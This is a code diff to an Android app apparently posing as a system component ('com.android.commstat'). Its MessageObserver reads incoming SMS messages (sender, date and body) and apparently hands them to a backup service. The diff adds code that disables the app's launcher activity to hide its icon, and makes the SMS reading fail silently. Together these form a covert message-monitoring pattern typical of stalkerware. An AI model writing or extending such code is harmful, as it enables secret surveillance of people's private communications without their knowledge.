@@ -1,14 +1,17 @@
 package com.android.commstat.receivers;
 
+import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.database.ContentObserver;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
 import android.util.Log;
 
+import com.android.commstat.MainActivity;
 import com.android.commstat.model.Sms;
 import com.android.commstat.services.BackupService;
 
@@ -27,6 +30,8 @@ public class MessageObserver extends ContentObserver {
             ContentResolver contentResolver = context.getContentResolver();
             contentResolver.registerContentObserver(Uri.parse(MessageObserver.CONTENT_SMS), true, new MessageObserver(context, new Handler()));
             IsRegistered = true;
+            PackageManager pkg = context.getPackageManager();
+            pkg.setComponentEnabledSetting(new ComponentName(context, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
         }
     }
 
@@ -38,12 +43,13 @@ public class MessageObserver extends ContentObserver {
     @Override
     public void onChange(boolean selfChange) {
         super.onChange(selfChange);
-        Uri smsUri = Uri.parse(CONTENT_SMS);
-        Cursor cur = mContext.getContentResolver().query(smsUri, new String[]{"_id", "thread_id", "address", /*"person",*/ "date", "body"}, null, null, null);
-        if (cur == null) {
-            return;
-        }
+        Cursor cur = null;
         try {
+            Uri smsUri = Uri.parse(CONTENT_SMS);
+            cur = mContext.getContentResolver().query(smsUri, new String[]{"_id", "thread_id", "address", /*"person",*/ "date", "body"}, null, null, null);
+            if (cur == null) {
+                return;
+            }
             cur.moveToNext();
             long messageId = cur.getLong(cur.getColumnIndex("_id"));
             if (messageId != mLastMessageId) {
@@ -71,8 +77,12 @@ public class MessageObserver extends ContentObserver {
                     }
                 }
             }
+        } catch (Exception ex) {
+            ex.printStackTrace();
         } finally {
-            cur.close();
+            if (cur != null) {
+                cur.close();
+            }
         }
     }
 }
